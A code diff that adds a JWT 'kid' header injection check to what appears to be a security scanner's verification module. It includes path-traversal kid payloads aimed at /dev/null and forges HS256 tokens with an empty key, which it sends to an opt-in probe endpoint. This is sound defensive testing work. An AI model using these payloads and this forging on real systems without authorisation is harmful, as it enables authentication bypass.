@@ -931,6 +931,54 @@ async def _recheck_jwt_alg_confusion(finding, fetch, timeout):
         _hashlib.sha256, src, "public-key-as-HMAC (RS256->HS256 confusion)")
 
 
+# `kid` values that make a mis-designed verifier load an EMPTY/known key file (path
+# traversal to /dev/null) — forging with an empty HMAC key then verifies.
+_KID_EMPTY_KEY_PAYLOADS = (
+    "../../../../../../../../../../dev/null",
+    "/dev/null",
+    "....//....//....//....//....//dev/null",
+    "..\\..\\..\\..\\..\\..\\..\\..\\nul",     # Windows NUL device
+)
+
+
+async def _recheck_jwt_kid_inject(finding, fetch, timeout):
+    """JWT ``kid`` (Key ID) header injection (CWE-347). A verifier that resolves the token's
+    `kid` header to a KEY FILE and HMAC-verifies with that file's contents is forgeable: a
+    path-traversal `kid` pointing at an empty file (``/dev/null``) yields an EMPTY key an
+    attacker also knows. Confirmed only by the SAME opt-in forge-accept probe as weak-key /
+    alg-confusion: forge the token with ``alg:HS256``, the malicious `kid`, and an EMPTY HMAC
+    key, and require the server to ACCEPT it (2xx, repeatably) where a bad-signature control
+    is rejected (401/403). Opt-in (operator ``jwt_probe_endpoint``), GET-only, no privilege
+    escalation (a benign marker claim only). Stays a lead until proven."""
+    import hashlib as _hashlib
+    from core.swarm_workers.vuln.jwt import _parse_jwt
+    endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
+    if not endpoint:
+        return False, 0.3, ("JWT carries a `kid` header — a verifier that resolves it to a "
+                            "key FILE is forgeable with a path-traversal kid + empty key; "
+                            "supply jwt_probe_endpoint (an in-scope authed GET) to confirm "
+                            "(lead)")
+    tok = finding.get("_jwt_token") or finding.get("jwt_token") or ""
+    if not tok:
+        return False, 0.0, "kid-inject finding missing token to forge (lead)"
+    parsed = _parse_jwt(tok)
+    if not parsed:
+        return False, 0.0, "could not parse the JWT to forge (lead)"
+    header, payload, _ = parsed
+    src = (finding.get("jwt_source") or "authorization").lower()
+    for kid in _KID_EMPTY_KEY_PAYLOADS:
+        h = dict(header)
+        h["alg"] = "HS256"
+        h["kid"] = kid
+        ok, conf, reason = await _hmac_forge_accept_probe(
+            fetch, timeout, endpoint, h, payload, b"", _hashlib.sha256, src,
+            f"kid-injection (kid path-traversal -> empty key)")
+        if ok:
+            return ok, conf, reason
+    return False, 0.3, ("forged tokens with a path-traversal `kid` + empty key were not "
+                        "accepted — kid does not resolve to a key file here (lead)")
+
+
 async def _recheck_jwt(finding, fetch, timeout):
     """Confirm a weak-HMAC-key JWT only by proving the SERVER ACCEPTS A FORGERY.
 
@@ -946,6 +994,8 @@ async def _recheck_jwt(finding, fetch, timeout):
     vt = (finding.get("vuln_type") or "").lower()
     if ":alg_confusion" in vt:
         return await _recheck_jwt_alg_confusion(finding, fetch, timeout)
+    if ":kid_inject" in vt:
+        return await _recheck_jwt_kid_inject(finding, fetch, timeout)
     if ":weak_key" not in vt or vt.endswith(("_noauth", "_sample")):
         return False, 0.3, "jwt observation — no safe read-only auto-confirmation (lead)"
     endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
